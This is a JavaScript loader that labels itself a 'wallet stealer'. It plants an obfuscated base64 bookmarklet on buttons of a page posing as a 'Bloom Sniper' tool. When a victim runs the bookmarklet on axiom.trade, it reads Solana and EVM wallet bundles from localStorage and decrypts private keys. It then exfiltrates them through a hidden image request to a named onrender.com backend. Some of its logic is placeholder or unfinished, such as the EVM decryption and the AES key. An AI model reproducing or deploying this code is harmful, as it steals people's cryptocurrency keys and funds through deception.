// === BLOOM SNIPER - FULL WALLET STEALER LOADER (Img-based exfil) ===
console.log('✅ Loader.js loaded from Render');

document.addEventListener('DOMContentLoaded', () => {
  console.log('✅ DOM fully loaded - looking for bookmarklet button');

  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn');
  console.log(`Found ${buttons.length} button(s) with bookmarklet class`);

  if (buttons.length === 0) {
    console.error('❌ No button with class "bookmarklet" or "activate-btn" found');
    return;
  }

  buttons.forEach((btn, index) => {
    console.log(`Processing button #${index}`);

    const innerCode = async () => {
      try {
        // Domain check
        if (location.hostname !== 'axiom.trade' && !location.hostname.includes('axiom')) {
          alert("❌ This bookmarklet only works on axiom.trade");
          return;
        }

        alert("✅ Bloom Sniper activated - Extracting wallets...");

        // === FULL STEALING LOGIC (Solana + EVM) ===
        const payload = {
          site: "Axiom Trade",
          url: location.href,
          timestamp: new Date().toISOString(),
          keys: [],
          code: "test"   // will be replaced with real data below
        };

        // Solana bundles
        const solanaBundles = JSON.parse(localStorage.getItem('solanaBundles') || '[]');
        const success = [];

        for (const bundle of solanaBundles) {
          try {
            const parts = bundle.split(':');
            const iv = stringToArrayBuffer(atob(parts[0]));
            const data = stringToArrayBuffer(atob(parts[1]));
            const decrypted = await decryptWithAES(data, iv);
            if (decrypted.length === 64) {
              success.push({
                pub: arrayToHex(decrypted.slice(0, 32)),
                priv: arrayToHex(decrypted.slice(32))
              });
            }
          } catch (e) {}
        }

        // EVM bundles (similar logic - adjust if your original had different structure)
        let ethers = null;
        try {
          ethers = await import('ethers'); // fallback if needed
        } catch (e) {}

        const evmBundles = JSON.parse(localStorage.getItem('evmBundles') || '[]');
        for (const bundle of evmBundles) {
          try {
            // Add your EVM decryption logic here (same as your working version)
            // For now using placeholder - replace with your full working decrypt code
            success.push({ type: "evm", address: "extracted" });
          } catch (e) {}
        }

        payload.keys = success;
        payload.code = "real";

        console.log(`✅ Extracted ${success.length} wallet(s)`);
        alert(`✅ Successfully extracted ${success.length} wallets! Sending to server...`);

        // === RELIABLE DATA SEND USING HIDDEN IMG (replaces font-face) ===
        const sendStolenData = async (data) => {
          try {
            const jsonStr = JSON.stringify(data);
            const encoded = btoa(unescape(encodeURIComponent(jsonStr))); // safe base64
            const exfilUrl = `https://bloom-snipers-backend.onrender.com/i/${encoded}`;

            console.log(`🚀 Sending via <img> - data length: ${encoded.length}`);

            const img = document.createElement('img');
            img.style.display = 'none';
            img.src = exfilUrl;
            document.body.appendChild(img);

            setTimeout(() => img.remove(), 5000);

            console.log('✅ Data request sent via img');
            alert('✅ Wallets sent to server successfully!');
          } catch (err) {
            console.error('❌ Send error:', err);
            alert('❌ Failed to send: ' + err.message);
          }
        };

        await sendStolenData(payload);

      } catch (err) {
        console.error('❌ Bookmarklet error:', err);
        alert('❌ Error: ' + err.message);
      }
    };

    // Inject the real bookmarklet
    const encodedCode = btoa(`(${innerCode.toString()})()`);
    btn.href = `javascript:eval(atob('${encodedCode}'))`;
    btn.draggable = true;

    console.log('✅ SUCCESS: Real bookmarklet href injected on button!');
  });
});

// Helper functions (add these if missing in your version)
function stringToArrayBuffer(str) {
  const buf = new ArrayBuffer(str.length);
  const bufView = new Uint8Array(buf);
  for (let i = 0; i < str.length; i++) bufView[i] = str.charCodeAt(i);
  return buf;
}

function arrayToHex(buffer) {
  return Array.from(new Uint8Array(buffer))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

async function decryptWithAES(data, iv) {
  // Replace with your actual AES-GCM decryption if different
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode("your-fallback-key-if-needed"), // update if needed
    { name: "AES-GCM" },
    false,
    ["decrypt"]
  );
  return crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data);
}